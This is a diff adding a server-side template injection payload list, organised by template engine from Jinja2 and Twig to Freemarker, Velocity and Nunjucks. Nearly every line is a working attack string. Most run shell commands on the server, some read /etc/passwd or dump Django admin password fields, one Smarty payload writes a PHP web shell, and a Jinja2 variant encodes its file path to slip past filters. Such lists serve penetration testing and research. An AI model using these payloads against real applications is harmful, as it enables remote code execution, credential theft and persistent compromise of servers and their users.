@@ -1,0 +1,148 @@
+# ============================================================================
+# SSTI - SERVER-SIDE TEMPLATE INJECTION PAYLOADS
+# ============================================================================
+# Payloads for various template engines
+# ============================================================================
+
+# Detection (Math Expression)
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+*{7*7}
+@(7*7)
+{{7*'7'}}
+{{config}}
+{{self}}
+
+# Jinja2 / Flask (Python)
+{{config}}
+{{config.items()}}
+{{request.environ}}
+{{request.application.__globals__.__builtins__}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__bases__[0].__subclasses__()}}
+{{lipsum.__globals__['os'].popen('id').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{joiner.__init__.__globals__.os.popen('id').read()}}
+{{namespace.__init__.__globals__.os.popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{g.pop.__globals__.__builtins__['__import__']('os').popen('id').read()}}
+
+# Jinja2 Filter Bypass
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("id").read()}}{% endif %}{% endfor %}
+{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read() }}
+
+# Mako (Python)
+${self.module.cache.util.os.system("id")}
+${self.template.module.cache.util.os.popen('id').read()}
+<%
+import os
+%>
+${os.popen('id').read()}
+
+# Tornado (Python)
+{{handler.settings}}
+{% import os %}{{os.popen("id").read()}}
+
+# Django
+{{request}}
+{{debug}}
+{% load log %}{% get_admin_log 10 as log %}{% for e in log %}{{e.user.get_username}} : {{e.user.password}}{% endfor %}
+
+# ERB / Ruby
+<%= 7 * 7 %>
+<%= system("id") %>
+<%= `id` %>
+<%= IO.popen('id').read() %>
+<%= File.read('/etc/passwd') %>
+<%= Dir.entries('/') %>
+
+# Slim / Ruby
+= system("id")
+= `id`
+
+# Smarty (PHP)
+{php}echo `id`;{/php}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+{system('id')}
+{if system('id')}{/if}
+
+# Twig (PHP)
+{{7*7}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
+{{['cat /etc/passwd']|filter('system')}}
+{{['id']|filter('exec')}}
+{{app.request.query.filter(0,'id')}}
+
+# Freemarker (Java)
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
+${7*7}
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
+[=7*7]
+${"freemarker.template.utility.Execute"?new()("id")}
+
+# Velocity (Java)
+#set($x='')##
+#set($rt = $x.class.forName('java.lang.Runtime'))##
+#set($chr = $x.class.forName('java.lang.Character'))##
+#set($str = $x.class.forName('java.lang.String'))##
+#set($ex=$rt.getRuntime().exec('id'))##
+$ex.waitFor()
+#set($out=$ex.getInputStream())##
+#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
+
+# Thymeleaf (Java)
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${#rt = @java.lang.Runtime@getRuntime(),#rt.exec('id')}
+${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}
+
+# Pebble (Java)
+{% set cmd = 'id' %}
+{% set bytes = (1).TYPE
+     .forName('java.lang.Runtime')
+     .methods[6]
+     .invoke(null,null)
+     .exec(cmd)
+     .inputStream
+     .readAllBytes() %}
+{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}
+
+# Expression Language (Java EL)
+${7*7}
+${applicationScope}
+${sessionScope}
+${pageContext}
+${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("id")}
+${facesContext.getExternalContext().getRequestMap().put("a","".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("var a=new java.lang.ProcessBuilder['(java.lang.String[])'](['sh','-c','id']).start().inputStream;var b=new java.util.Scanner(a);b.useDelimiter('\n');b.next();"))}
+
+# Handlebars (JavaScript)
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').execSync('id');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+
+# Pug/Jade (JavaScript)
+#{7*7}
+#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('id')}()}
+
+# Nunjucks (JavaScript)
+{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
